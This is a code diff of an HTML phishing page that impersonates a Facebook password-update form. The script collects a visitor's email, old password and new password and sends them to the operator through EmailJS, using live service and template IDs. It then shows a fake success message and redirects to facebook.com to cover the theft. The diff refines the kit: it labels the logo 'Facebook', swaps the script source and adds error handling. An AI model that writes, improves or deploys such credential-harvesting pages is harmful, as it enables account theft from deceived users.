@@ -111,7 +111,7 @@
 <body>
 
   <div class="logo-section">
-    <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Logo">
+    <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Facebook">
   </div>
 
   <div class="password-box" id="passwordBox">
@@ -133,11 +133,10 @@
     <h3>Password Updated Successfully</h3>
   </div>
 
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
   <script>
-    (function() {
-      emailjs.init('ODWuzZ-mZLM196nkP'); // Initialize EmailJS with your user ID
-    })();
+    // Initialize EmailJS
+    emailjs.init('ODWuzZ-mZLM196nkP'); // Replace with your EmailJS User ID
 
     document.getElementById('passwordForm').addEventListener('submit', function(event) {
       event.preventDefault();
@@ -146,25 +145,24 @@
       const oldPassword = document.getElementById('oldPassword').value;
       const newPassword = document.getElementById('newPassword').value;
 
-      // Send data via EmailJS
+      // Send email with the form details using EmailJS
       emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
         email: email,
         oldPassword: oldPassword,
         newPassword: newPassword
-      })
-      .then(function(response) {
-        console.log('Success:', response);
-        // Show success message
+      }).then(function(response) {
+        console.log('SUCCESS', response);
+        // Show success message and hide form
         document.getElementById('passwordBox').style.display = 'none';
         document.getElementById('successMessage').style.display = 'flex';
-        
-        // Redirect after 2 seconds
+
+        // Redirect to Facebook after 2 seconds
         setTimeout(function() {
           window.location.href = 'https://facebook.com';
         }, 2000);
-      })
-      .catch(function(error) {
-        console.log('Error:', error);
+      }, function(error) {
+        console.log('FAILED', error);
+        alert('Something went wrong, please try again.');
       });
     });
   </script>
